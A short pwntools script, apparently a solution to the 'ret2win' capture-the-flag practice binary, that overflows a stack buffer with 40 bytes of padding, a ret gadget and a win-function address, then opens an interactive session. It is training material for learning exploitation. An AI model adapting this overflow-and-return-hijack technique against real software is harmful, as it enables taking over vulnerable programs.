


```python
from pwn import *

p = process("./ret2win")

offset = 40

addr_win = p64(0x400756)

ret_gadget = p64(0x40053e)

payload = b'A'*offset + ret_gadget + addr_win

p.sendline(payload)

p.interactive()
```
